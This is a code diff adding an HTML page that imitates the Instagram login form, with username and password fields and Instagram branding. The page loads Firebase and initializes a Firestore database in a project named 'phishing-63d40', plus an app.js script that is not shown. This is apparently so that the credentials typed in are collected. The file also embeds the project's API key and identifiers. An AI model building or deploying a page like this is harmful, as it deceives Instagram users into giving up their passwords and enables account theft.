@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
+  <link rel="stylesheet" href="style.css">
+  <title>Instagram Login Form</title>
+</head>
+
+<body>
+
+  <div id="wrapper">
+    <div class="container">
+      <div class="phone-app-demo"></div>
+      <div class="form-data">
+        <form action="" id="form-1">
+          <div class="logo">
+            <img src="./images/logo.png" alt="logo">
+          </div>
+          <input type="text" placeholder="Phone number, username, or email" id="username" name="username">
+          <input type="password" placeholder="Password" id="pw" name="pw">
+          <button class="form-btn" type="submit">Log in</button>
+          <span class="has-separator">Or</span>
+          <a class="facebook-login" href="#">
+            <i class="fab fa-facebook-square"></i> Log in with Facebook
+          </a>
+          <a class="password-reset" href="#">Forgot password?</a>
+        </form>
+        <div class="sign-up">
+          Don't have an account? <a href="#">Sign up</a>
+        </div>
+        <div class="get-the-app">
+          <span>Get the app.</span>
+          <div class="badges">
+            <img src="./images/app-store.png" alt="app-store badge">
+            <img src="./images/google-play.png" alt="google-play badge">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <nav class="footer-nav">
+          <ul>
+            <li>
+              <a href="#">About us</a>
+            </li>
+            <li>
+              <a href="#">Support</a>
+            </li>
+            <li>
+              <a href="#">Press</a>
+            </li>
+            <li>
+              <a href="#">Api</a>
+            </li>
+            <li>
+              <a href="#">Jobs</a>
+            </li>
+            <li>
+              <a href="#">Privacy</a>
+            </li>
+            <li>
+              <a href="#">Terms</a>
+            </li>
+            <li>
+              <a href="#">Directory</a>
+            </li>
+            <li>
+              <a href="#">Profiles</a>
+            </li>
+            <li>
+              <a href="#">Hashtags</a>
+            </li>
+            <li>
+              <a href="#">Languages</a>
+            </li>
+          </ul>
+        </nav>
+        <div class="copyright-notice">
+          &copy 2019 Instagram
+        </div>
+      </div>
+    </footer>
+
+  </div>
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-firestore.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyBxj42MlCelOqQGRRuzPfA2SzJXTnH2dpY",
+    authDomain: "phishing-63d40.firebaseapp.com",
+    projectId: "phishing-63d40",
+    storageBucket: "phishing-63d40.appspot.com",
+    messagingSenderId: "891821083987",
+    appId: "1:891821083987:web:88a5f2fff37ecf1d3d25a6"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  var db = firebase.firestore();
+</script>
+<script src="app.js"></script>
+</body>
+
+</html>
